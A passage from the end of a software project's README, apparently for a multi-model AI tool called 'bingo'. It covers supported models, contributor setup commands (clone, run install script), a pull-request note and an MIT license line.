- Multi-model support (DeepSeek / Claude / GPT / GLM / Qwen / Ollama)

---

## Contributing

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

Pull requests are welcome. Please open an issue first for major changes.

---

## License

MIT © 2026 bingook
